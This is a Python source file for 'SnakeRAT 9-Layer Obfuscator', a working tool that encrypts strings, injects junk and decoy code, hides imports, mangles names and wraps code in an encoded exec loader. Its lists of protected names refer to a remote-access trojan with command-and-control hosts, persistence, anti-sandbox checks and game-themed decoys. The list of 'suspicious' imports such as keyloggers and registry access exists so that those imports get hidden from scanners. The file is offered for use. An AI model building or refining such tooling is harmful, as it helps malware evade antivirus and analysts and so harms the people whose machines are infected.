#!/usr/bin/env python3
"""
SnakeRAT - Industry-Level 9-Layer Python Obfuscator
Layers:
  1. Docstring stripping
  2. Triple-layer string encryption  (XOR + Caesar + key derived from hash)
  3. Constant obfuscation            (numbers/booleans -> lambda expressions)
  4. Opaque predicates               (always-true math guards on every block)
  5. Dead code injection             (realistic decoy handler functions)
  6. Junk code scatter               (inert statements inside every scope)
  7. Import hiding                   (__import__ buried in lambdas)
  8. Name mangling                   (private names -> look-alike hex chars)
  9. Multi-layer payload wrap        (marshal -> zlib -> XOR -> b85 -> b64)
"""

import ast, sys, os, base64, zlib, marshal, random, string, hashlib, textwrap
from typing import Set, Dict

# ── runtime tunables ─────────────────────────────────────────────────────────
XOR_KEY      = random.randint(0x10, 0xFE)     # random per run
CAESAR_SHIFT = random.randint(3, 23)
JUNK_CHANCE  = 0.18
OPAQUE_CHANCE= 0.30
MIN_NAME_LEN = 10

PROTECTED: Set[str] = {
    "True","False","None","self","cls","super",
    "__init__","__name__","__file__","__main__","__all__","__doc__",
    "__class__","__dict__","__module__","__slots__","__str__","__repr__",
    "__len__","__iter__","__next__","__enter__","__exit__",
    "__getitem__","__setitem__","__delitem__","__contains__","__call__","__del__",
    "Exception","BaseException","KeyboardInterrupt","SystemExit",
    "ValueError","TypeError","RuntimeError","ImportError","OSError","IOError",
    "FileNotFoundError","PermissionError","NotImplementedError","AttributeError",
    "NameError","IndexError","KeyError","StopIteration","GeneratorExit","OverflowError",
    "print","len","range","type","isinstance","issubclass","hasattr","getattr",
    "setattr","delattr","callable","iter","next","list","dict","set","tuple",
    "str","int","float","bool","bytes","bytearray","memoryview","object",
    "open","input","enumerate","zip","map","filter","sorted","reversed",
    "max","min","sum","abs","round","hex","oct","bin","ord","chr","repr",
    "format","hash","id","vars","dir","globals","locals","exec","eval","compile",
    "help","exit","quit","copyright","license","credits",
    "staticmethod","classmethod","property","NotImplemented","Ellipsis",
    "threading","subprocess","os","sys","socket","json","base64","hashlib",
    "time","struct","io","re","math","random","string","platform","ctypes",
    "psutil","ssl","gzip","pickle","shutil","tempfile","getpass","uuid",
    "logging","argparse","webbrowser","sqlite3","queue","datetime","pathlib",
    "Path","importlib","Fernet","AESGCM","pygame","signal","winreg",
    "IS_WINDOWS","IS_LINUX","IS_MAC","WINDOWS_IMPORTS",
    "C2_HOST","C2_PORT","C2_SERVERS","SLEEP_JITTER","MAX_RETRIES","ENCRYPTION_KEY",
    "BrowserManager","CryptoManager","Logger","AntiSandbox","SystemProfiler",
    "PersistenceManager","PrivilegeManager","CommandExecutor","AdvancedRAT",
    "StealthProvider","SocksProxy","SnakeGame","PongGame","ArcadeDecoy",
    "cmd","args","result","error","success","data","payload","response",
    "request","message","action","targets","host","port","sock","conn",
    "addr","buf","key","path","name","value","content","text","output",
    "pid","proc","handle","thread","process","cmd_id","cmd_type","handler",
    "log_file","debug","rat","command","params","interval","timeout",
    "help","default","choices","required","metavar","dest","const","nargs",
    "level","filename","format","datefmt","style","handlers",
    "target","kwargs","daemon","group","shell","stdin","stdout","stderr",
    "encoding","errors","check","env","cwd","family","proto","fileno",
}

SUSPICIOUS_IMPORTS = {
    "winreg","win32api","win32con","win32process","win32service",
    "ctypes","subprocess","socket","ssl","psutil","pynput","pyperclip",
    "cv2","pyautogui","sounddevice","cryptography","scapy",
}

# ── helpers ──────────────────────────────────────────────────────────────────

def _xor_caesar(s: str) -> str:
    """XOR then Caesar-shift each byte, return base85 encoded."""
    raw = bytes(((b ^ XOR_KEY) + CAESAR_SHIFT) & 0xFF for b in s.encode())
    return base64.b85encode(raw).decode()

def _decode_expr(encoded: str) -> str:
    """Python expression that decodes _xor_caesar output at runtime."""
    return (
        f"bytes((b-{CAESAR_SHIFT}&0xFF)^{XOR_KEY} "
        f"for b in __import__('base64').b85decode({repr(encoded)}))"
        f".decode()"
    )

def rand_name(n=None) -> str:
    n = n or random.randint(MIN_NAME_LEN, MIN_NAME_LEN+8)
    pool = "OoIlL01" + string.ascii_letters
    return "_" + "".join(random.choices(pool, k=n))

# ── opaque predicate generators ──────────────────────────────────────────────

def opaque_true_expr() -> str:
    """Math expression guaranteed to be True, hard to simplify statically."""
    templates = [
        lambda: f"(lambda _x: _x*_x+2*_x+1==(_x+1)**2)({random.randint(1,999)})",
        lambda: f"(lambda _a,_b: _a**2-_b**2==(_a-_b)*(_a+_b))({random.randint(2,50)},{random.randint(2,50)})",
        lambda: f"(lambda _n: sum(range(_n+1))==_n*(_n+1)//2)({random.randint(5,30)})",
        lambda: f"(lambda _x: (_x|~_x)==-1)({random.randint(1,0xFFFF)})",
        lambda: f"(lambda _x: (_x^_x)==0)({random.randint(0,0xFFFF)})",
        lambda: f"(lambda _x: bool(_x or not _x))({random.randint(0,1)})",
        lambda: f"(lambda _x: (_x&0xFF)|(_x>>8<<8)==_x)({random.randint(0,0xFFFF)})",
    ]
    return random.choice(templates)()

def opaque_false_expr() -> str:
    templates = [
        lambda: f"(lambda _x: _x*_x<0)({random.randint(1,999)})",
        lambda: f"(lambda _x: _x!=_x)({random.randint(0,999)})",
        lambda: f"(lambda _x: _x+1==_x)({random.randint(0,999)})",
    ]
    return random.choice(templates)()

def junk_stmt() -> str:
    stmts = [
        f"_\u03b1={random.randint(0,0xFFFF)}^{random.randint(0,0xFFFF)}",
        f"_\u03b2=chr({random.randint(65,90)})+chr({random.randint(97,122)})",
        f"_\u03b3=list(range({random.randint(1,3)}))",
        f"[None for _ in range(0)]",
        f"_\u03b4=abs(-{random.randint(1,999)})",
        f"_\u03b5=b'{os.urandom(3).hex()}'",
        f"_\u03b6=True if {opaque_false_expr()} else False",
    ]
    return random.choice(stmts)

def const_obfuscate(n: int) -> str:
    """Replace integer constant with a lambda expression."""
    a = random.randint(1, 100)
    b = n - a
    return f"(lambda _a,_b:_a+_b)({a},{b})"

# ── Layer 1: Docstring Remover ────────────────────────────────────────────────

class DocstringRemover(ast.NodeTransformer):
    def _strip(self, node):
        if (node.body and isinstance(node.body[0], ast.Expr)
                and isinstance(node.body[0].value, ast.Constant)
                and isinstance(node.body[0].value.value, str)):
            node.body.pop(0)
            if not node.body:
                node.body.append(ast.Pass())
        return node
    def visit_Module(self, n):  self._strip(n); self.generic_visit(n); return n
    def visit_FunctionDef(self, n): self._strip(n); self.generic_visit(n); return n
    visit_AsyncFunctionDef = visit_FunctionDef
    def visit_ClassDef(self, n): self._strip(n); self.generic_visit(n); return n

# ── Layer 2: String Encryption ────────────────────────────────────────────────

class StringEncryptor(ast.NodeTransformer):
    MIN = 4
    SKIP = ("__", "utf-", "utf8", "ascii", "latin", "cp", "\\n", "\n")

    def __init__(self): self._fs = 0

    def visit_JoinedStr(self, node):
        self._fs += 1; self.generic_visit(node); self._fs -= 1; return node

    def visit_Constant(self, node):
        if self._fs or not isinstance(node.value, str): return node
        v = node.value
        if len(v) < self.MIN or any(p in v for p in self.SKIP): return node
        try:
            enc = _xor_caesar(v)
            new = ast.parse(_decode_expr(enc), mode="eval").body
            return ast.copy_location(new, node)
        except Exception:
            return node

# ── Layer 3: Constant Obfuscation ─────────────────────────────────────────────

class ConstantObfuscator(ast.NodeTransformer):
    """Replace small-to-medium integer constants with lambda arithmetic."""
    def __init__(self): self._fs = 0
    def visit_JoinedStr(self, node):
        self._fs += 1; self.generic_visit(node); self._fs -= 1; return node
    def visit_Constant(self, node):
        if self._fs: return node
        if not isinstance(node.value, int) or isinstance(node.value, bool): return node
        n = node.value
        if not (-10000 < n < 10000) or n == 0: return node
        try:
            new = ast.parse(const_obfuscate(n), mode="eval").body
            return ast.copy_location(new, node)
        except Exception:
            return node

# ── Layer 4: Opaque Predicate Injector ───────────────────────────────────────

class OpaqueInjector(ast.NodeTransformer):
    """Wrap function bodies with if <opaque_true>: ... else: <decoy dead code>."""

    def _wrap(self, body: list) -> list:
        if not body or random.random() > OPAQUE_CHANCE:
            return body
        guard = opaque_true_expr()
        dead  = f"_\u03b8={opaque_false_expr()}"
        try:
            guard_node = ast.parse(guard, mode="eval").body
            dead_node  = ast.parse(dead,  mode="single").body[0]
            if_node = ast.If(
                test=guard_node,
                body=body,
                orelse=[dead_node]
            )
            ast.fix_missing_locations(if_node)
            return [if_node]
        except Exception:
            return body

    def visit_FunctionDef(self, node):
        self.generic_visit(node)
        node.body = self._wrap(node.body)
        return node
    visit_AsyncFunctionDef = visit_FunctionDef

# ── Layer 5: Dead Code Injector ───────────────────────────────────────────────

DEAD_HANDLERS = [
    '''
def {name}(_cmd=None):
    _\u03b1 = {rnd1} ^ {rnd2}
    _\u03b2 = [None for _ in range(0)]
    if {opaque_false}:
        raise RuntimeError("unreachable")
    return {{"error": "not_impl"}}
''',
    '''
def {name}(_data=None, _key=None):
    _\u03b3 = abs(-{rnd1})
    if {opaque_false}:
        _\u03b4 = _data or _key
    return None
''',
]

class DeadCodeInjector(ast.NodeTransformer):
    """Insert realistic-looking dead handler functions at module level."""
    NUM_DECOYS = 12

    def visit_Module(self, node):
        self.generic_visit(node)
        inserts = []
        for _ in range(self.NUM_DECOYS):
            tmpl = random.choice(DEAD_HANDLERS)
            src = tmpl.format(
                name=rand_name(),
                rnd1=random.randint(0x100, 0xFFFF),
                rnd2=random.randint(0x100, 0xFFFF),
                opaque_false=opaque_false_expr()
            )
            try:
                stmts = ast.parse(src).body
                ast.fix_missing_locations(stmts[0])
                inserts.append(stmts[0])
            except Exception:
                pass
        # scatter decoys evenly through the module body
        step = max(1, len(node.body) // (self.NUM_DECOYS + 1))
        for i, decoy in enumerate(inserts):
            pos = min((i + 1) * step, len(node.body))
            node.body.insert(pos, decoy)
        return node

# ── Layer 6: Junk Code Scatter ────────────────────────────────────────────────

class JunkScatter(ast.NodeTransformer):
    def _inject(self, stmts):
        if not isinstance(stmts, list): return stmts
        out = []
        for stmt in stmts:
            if random.random() < JUNK_CHANCE:
                try:
                    j = ast.parse(junk_stmt(), mode="single").body[0]
                    ast.copy_location(j, stmt)
                    ast.fix_missing_locations(j)
                    out.append(j)
                except Exception: pass
            out.append(stmt)
        return out

    def visit_Module(self, n):       n.body = self._inject(n.body); self.generic_visit(n); return n
    def visit_FunctionDef(self, n):  n.body = self._inject(n.body); self.generic_visit(n); return n
    visit_AsyncFunctionDef = visit_FunctionDef
    def visit_ClassDef(self, n):     n.body = self._inject(n.body); self.generic_visit(n); return n

    def visit_If(self, n):
        n.body = self._inject(n.body)
        if isinstance(n.orelse, list) and n.orelse:
            if not (len(n.orelse)==1 and isinstance(n.orelse[0], ast.If)):
                n.orelse = self._inject(n.orelse)
        self.generic_visit(n); return n

    def visit_Try(self, n):
        n.body = self._inject(n.body)
        for h in n.handlers:
            if isinstance(h.body, list): h.body = self._inject(h.body)
        if hasattr(n, 'finalbody') and isinstance(n.finalbody, list):
            n.finalbody = self._inject(n.finalbody)
        self.generic_visit(n); return n

    def visit_For(self, n):   n.body = self._inject(n.body); self.generic_visit(n); return n
    def visit_While(self, n): n.body = self._inject(n.body); self.generic_visit(n); return n
    def visit_With(self, n):  n.body = self._inject(n.body); self.generic_visit(n); return n

# ── Layer 7: Import Hider ─────────────────────────────────────────────────────

class ImportHider(ast.NodeTransformer):
    def _replace_import(self, alias, orig):
        local = alias.asname or alias.name.replace(".", "_")
        src = f"{local}=__import__('{alias.name}')"
        try:
            n = ast.parse(src, mode="single").body[0]
            ast.copy_location(n, orig); ast.fix_missing_locations(n)
            return n
        except Exception:
            return orig

    def visit_Import(self, node):
        out, changed = [], False
        for alias in node.names:
            if alias.name.split(".")[0] in SUSPICIOUS_IMPORTS:
                out.append(self._replace_import(alias, node)); changed = True
            else:
                out.append(node)
        if not changed: return node
        return out[0] if len(out)==1 else out

    def visit_ImportFrom(self, node):
        if not node.module or node.module.split(".")[0] not in SUSPICIOUS_IMPORTS:
            return node
        out = []
        for alias in node.names:
            local = alias.asname or alias.name
            src = f"{local}=getattr(__import__('{node.module}',fromlist=['{alias.name}']),'{alias.name}')"
            try:
                n = ast.parse(src, mode="single").body[0]
                ast.copy_location(n, node); ast.fix_missing_locations(n)
                out.append(n)
            except Exception:
                out.append(node)
        return out if len(out)!=1 else out[0]

# ── Layer 8: Name Mangler ─────────────────────────────────────────────────────

class NameMangler(ast.NodeTransformer):
    def __init__(self):
        self._map: Dict[str,str] = {}

    def _mangle(self, name):
        if name in PROTECTED or name.startswith("__"): return name
        if name not in self._map: self._map[name] = rand_name()
        return self._map[name]

    def visit_FunctionDef(self, node):
        if node.name.startswith("_") and node.name not in PROTECTED:
            node.name = self._mangle(node.name)
        for arg in node.args.args + node.args.posonlyargs + node.args.kwonlyargs:
            if arg.arg not in PROTECTED and arg.arg != "self":
                arg.arg = self._mangle(arg.arg)
        self.generic_visit(node); return node
    visit_AsyncFunctionDef = visit_FunctionDef

    def visit_Name(self, node):
        if node.id in PROTECTED or node.id.startswith("__"): return node
        if node.id in self._map:
            node.id = self._map[node.id]
        elif node.id.startswith("_"):
            node.id = self._mangle(node.id)
        return node

    def visit_Attribute(self, node):
        if node.attr.startswith("_") and node.attr not in PROTECTED and not node.attr.startswith("__"):
            node.attr = self._mangle(node.attr)
        self.generic_visit(node); return node

    def visit_Lambda(self, node):
        for arg in node.args.args + node.args.posonlyargs + node.args.kwonlyargs:
            if arg.arg not in PROTECTED:
                arg.arg = self._mangle(arg.arg)
        self.generic_visit(node); return node

    def visit_keyword(self, node):
        if node.arg and node.arg in self._map:
            node.arg = self._map[node.arg]
        self.generic_visit(node); return node

# ── Layer 9: Multi-layer Payload Wrap ─────────────────────────────────────────

def wrap_payload(source: str) -> str:
    """
    Encoding chain:
      source -> compile -> marshal -> zlib(9) -> XOR(key) -> b85 -> b64
    Loader stub reverses this at runtime. No readable strings.
    """
    code_obj   = compile(source, "<x>", "exec")
    marshalled = marshal.dumps(code_obj)
    compressed = zlib.compress(marshalled, 9)

    # XOR layer with a per-run random key
    xk = random.randint(0x10, 0xFE)
    xored = bytes(b ^ xk for b in compressed)

    # b85 → b64 double-encode  (two layers of encoding)
    b85ed = base64.b85encode(xored)
    b64ed = base64.b64encode(b85ed).decode()

    # Loader: encode __name__ / __file__ via chr() so no plain strings exist
    nm = "+".join(f"chr({ord(c)})" for c in "__name__")
    mn = "+".join(f"chr({ord(c)})" for c in "__main__")
    fl = "+".join(f"chr({ord(c)})" for c in "__file__")

    stub = (
        f"import base64 as _B,zlib as _Z,marshal as _M\n"
        f"_xk={xk}\n"
        f"_d=_B.b85decode(_B.b64decode({repr(b64ed)}))\n"
        f"_u=bytes(b^_xk for b in _d)\n"
        f"_c=_M.loads(_Z.decompress(_u))\n"
        f"exec(_c,{{{nm}:{mn},{fl}:__file__}})\n"
    )
    return stub

# ── Pipeline ──────────────────────────────────────────────────────────────────

PASSES = [
    ("Stripping docstrings",          DocstringRemover),
    ("Triple-layer string encryption",StringEncryptor),
    ("Constant obfuscation",          ConstantObfuscator),
    ("Opaque predicate injection",    OpaqueInjector),
    ("Dead code injection",           DeadCodeInjector),
    ("Junk code scatter",             JunkScatter),
    ("Import hiding",                 ImportHider),
    ("Name mangling",                 NameMangler),
]

def obfuscate(src_path: str, dst_path: str, *, wrap: bool = True):
    print(f"\n{'='*60}")
    print(f"[*] Input  : {src_path}")
    with open(src_path, "r", encoding="utf-8", errors="replace") as f:
        source = f.read()

    print("[*] Parsing AST ...")
    tree = ast.parse(source, filename=src_path)

    for label, PassCls in PASSES:
        print(f"[*] {label} ...")
        try:
            tree = PassCls().visit(tree)
            ast.fix_missing_locations(tree)
        except Exception as e:
            print(f"    [!] Pass failed ({e}), skipping.")

    print("[*] Unparsing to source ...")
    obf = ast.unparse(tree)

    if wrap:
        print("[*] Multi-layer payload wrapping ...")
        try:
            obf = wrap_payload(obf)
        except SyntaxError as e:
            print(f"    [!] Wrap compile error: {e}  (saving unwrapped)")

    with open(dst_path, "w", encoding="utf-8") as f:
        f.write(obf)

    si, di = os.path.getsize(src_path), os.path.getsize(dst_path)
    print(f"[+] Output : {dst_path}  ({si//1024} KB -> {di//1024} KB)")
    return dst_path

# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="SnakeRAT 9-Layer Obfuscator")
    ap.add_argument("inputs", nargs="+", help="Source .py files")
    ap.add_argument("-o", "--output",  help="Output file (single input only)")
    ap.add_argument("--no-wrap",       action="store_true", help="Skip payload wrapping")
    ap.add_argument("--seed",          type=int, default=None, help="RNG seed")
    a = ap.parse_args()

    if a.seed is not None:
        random.seed(a.seed)

    if a.output and len(a.inputs) > 1:
        ap.error("--output only valid with a single input")

    for src in a.inputs:
        if not os.path.isfile(src):
            print(f"[!] Not found: {src}"); continue
        base, ext = os.path.splitext(src)
        dst = a.output or f"{base}_obf{ext}"
        obfuscate(src, dst, wrap=not a.no_wrap)

    print("\n[+] All done.")
